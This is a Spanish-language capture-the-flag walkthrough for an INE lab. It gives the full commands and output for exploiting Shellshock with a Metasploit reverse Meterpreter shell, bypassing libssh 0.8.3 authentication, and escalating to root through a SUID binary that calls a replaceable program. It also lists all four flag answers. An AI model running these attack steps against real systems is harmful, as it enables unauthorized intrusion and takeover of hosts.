# 🧩 CTF de Ataques Basados en Host – 2 (Shellshock + Libssh + SUID)

## 📋 Descripción del laboratorio

**Máquinas objetivo:**  
- `target1.ine.local` (servidor Apache vulnerable a Shellshock)  
- `target2.ine.local` (servidor SSH con libssh vulnerable y binario SUID)

**Formato de banderas:** hash MD5 precedido por `FLAGx_`. Solo se entrega el hash (sin el prefijo ni el guion bajo).  
**Objetivo:** aplicar ataques basados en host para capturar cuatro banderas.

---

## 🛠️ Herramientas empleadas

| Herramienta    | Propósito |
|----------------|-----------|
| **Nmap**       | Escaneo de puertos y detección de versiones |
| **Metasploit** | Módulos de escaneo y explotación (Shellshock, libssh) |
| **Shell meterpreter** | Ejecución de comandos en el objetivo |
| **Session**    | Manejo de sesiones y navegación de archivos |

---

## 🔎 Fase 1: Enumeración de target1.ine.local

```bash
nmap -sC -sV target1.ine.local
```

| Opción | Significado |
|--------|-------------|
| `-sC`  | Scripts NSE por defecto |
| `-sV`  | Detección de versión de servicios |

**Salida esperada (fragmento):**
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.6 ((Unix))
|_http-title: Browser Detector
|_http-server-header: Apache/2.4.6 (Unix)
| http-methods:
|_  Potentially risky methods: TRACE
```

Se identifica **Apache 2.4.6** con una página título "Browser Detector". Esto sugiere la presencia de un script CGI (`browser.cgi`), común en ejercicios de Shellshock.

---

## 🐚 Fase 2: Explotación de Shellshock (CVE-2014-6271)

### 🔍 Confirmación con módulo auxiliar

```bash
msfconsole
use auxiliary/scanner/http/apache_mod_cgi_bash_env
set RHOST target1.ine.local
set TARGETURI /browser.cgi
run
```

| Opción       | Valor                  | Significado |
|--------------|------------------------|-------------|
| `RHOST`      | `target1.ine.local`    | IP del objetivo |
| `TARGETURI`  | `/browser.cgi`         | Ruta del script CGI |

**Resultado esperado:**  
```
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Si el objetivo es vulnerable, se muestra un mensaje indicando que la cabecera `User-Agent` modificada provocó la ejecución de un comando de prueba.

### 🚀 Explotación con módulo de ejecución

```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set TARGETURI /browser.cgi
set LHOST 192.13.41.2
set RHOST target1.ine.local
exploit
```

| Opción      | Valor               | Significado |
|-------------|---------------------|-------------|
| `LHOST`     | IP de Kali (ejemplo) | Donde se recibe la shell inversa |
| `RHOST`     | `target1.ine.local` | Objetivo vulnerable |

**Progreso en consola:**
```
[*] Started reverse TCP handler on 192.13.41.2:4444
[*] Command Stager progress - 100.00% done (1092/1092 bytes)
[*] Sending stage (1017704 bytes) to 192.13.41.3
[*] Meterpreter session 1 opened (192.13.41.2:4444 -> 192.13.41.3:47790)
```

✅ Se obtiene una sesión **Meterpreter** con los permisos del usuario del servicio Apache.

---

## 🚩 Flag 1 – Archivo en el directorio raíz

Dentro de Meterpreter, abrimos una shell:

```bash
meterpreter > shell
```

Navegamos a la raíz y listamos:

```bash
/bin/bash -i
cd /
ls
cat flag.txt
```

**Resultado:**
```
FLAG1_0abce394943f48d7b42a56bcd10610e7
```
✅ **Flag 1:** `0abce394943f48d7b42a56bcd10610e7`

---

## 🚩 Flag 2 – Archivo oculto en el directorio de Apache

La pista menciona explorar `/opt/apache/htdocs/` con cuidado. Allí puede existir un archivo oculto (precedido por un punto).

```bash
cd /opt/apache/htdocs/
ls -la
```

**Salida esperada:**
```
total 32
drwxr-xr-x 1 root root 4096 ...
-rw-r--r-- 1 root root   39 ...  .flag.txt
-rwxr-xr-x 1 root root 6364 ...  browser.cgi
-rw-r--r-- 1 root root  517 ...  index.html
drwxr-xr-x 5 root root 4096 ...  static
```

El archivo **`.flag.txt`** es oculto. Lo leemos:

```bash
cat .flag.txt
```

**Resultado:**
```
FLAG2_72a434a2c7a4418e8d04f8c30ea10706
```
✅ **Flag 2:** `72a434a2c7a4418e8d04f8c30ea10706`

---

## 🔎 Fase 3: Enumeración de target2.ine.local

```bash
nmap -sC -sV target2.ine.local
```

**Salida:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     libssh 0.8.3 (protocol 2.0)
| ssh-hostkey:
|_  2048 31:e2:1d:f1:b2:39:0c:a3:ec:db:01:4a:eb:a2:39:c7 (RSA)
```

Se detecta **libssh 0.8.3**, vulnerable a un bypass de autenticación (CVE-2018-10933).

---

## 🔓 Fase 4: Bypass de autenticación SSH

```bash
msfconsole
search libssh 0.8.3
```

Seleccionamos el módulo auxiliar:

```bash
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOST target2.ine.local
set SPAWN_PTY true
exploit
```

| Opción       | Significado |
|--------------|-------------|
| `SPAWN_PTY`  | Solicita una terminal PTY interactiva |

**Resultado:**
```
[*] 192.13.41.4:22 - Attempting authentication bypass
[*] Command shell session 2 opened (192.13.41.2:46863 -> 192.13.41.4:22)
[*] Scanned 1 of 1 hosts (100% complete)
```

✅ Se obtiene una **shell sin credenciales**.

---

## 🚩 Flag 3 – Directorio del usuario

```bash
cd /home/user
ls
```

**Salida:**
```
flag.txt  greetings  welcome
```

```bash
cat flag.txt
```

**Resultado:**
```
FLAG3_a608f6d5bcf34c648bae8ec9dca24ab5
```
✅ **Flag 3:** `a608f6d5bcf34c648bae8ec9dca24ab5`

---

## ⚡ Fase 5: Escalada de privilegios mediante binario SUID

Se observa que en el directorio del usuario existe un binario `welcome` con el bit SUID activado y perteneciente a root:

```bash
ls -l
```

```
-rwsr-xr-x 1 root root 8344 Jun 11  2024 welcome
-rwxr-xr-x 1 user user 1117080 Jan 24 05:34 greetings
```

El binario `welcome` ejecuta el programa `greetings` sin ruta absoluta, como lo revelan las cadenas internas:

```bash
strings welcome
```

Se ve la cadena `greetings`. Como `greetings` es escribible por el usuario, se puede reemplazar por `/bin/bash`:

```bash
rm greetings
cp /bin/bash greetings
```

Ejecutamos `welcome`:

```bash
./welcome
```

El prompt cambia a `root`. Verificamos:

```bash
whoami
```
```
root
```

---

## 🚩 Flag 4 – Directorio /root

```bash
cat /root/flag.txt
```

**Resultado:**
```
FLAG4_42a76ea6891e427f85177dcb35cf9c7c
```
✅ **Flag 4:** `42a76ea6891e427f85177dcb35cf9c7c`

---

## 🧠 Resumen del flujo de ataque

| Máquina   | Vulnerabilidad               | Explotación / Herramienta                          | Flags |
|-----------|------------------------------|----------------------------------------------------|-------|
| target1   | Shellshock (CVE-2014-6271)   | `apache_mod_cgi_bash_env_exec` (Metasploit)        | 1, 2  |
| target2   | libssh 0.8.3 bypass          | `libssh_auth_bypass` (Metasploit)                  | 3     |
| target2   | Binario SUID mal configurado | Reemplazo de `greetings` por `/bin/bash`           | 4     |

### 💡 Lecciones aprendidas

- La vulnerabilidad **Shellshock** permite RCE en servidores Apache que ejecuten scripts CGI sin filtrar las cabeceras HTTP.
- Los archivos ocultos (`.flag.txt`) pasan desapercibidos en un `ls` normal, por lo que siempre se debe usar `ls -la`.
- La derivación de autenticación en **libssh 0.8.3** entrega una shell directa sin necesidad de credenciales.
- Los binarios con **SUID** que llaman a otros comandos sin ruta absoluta son un vector clásico de escalada local.
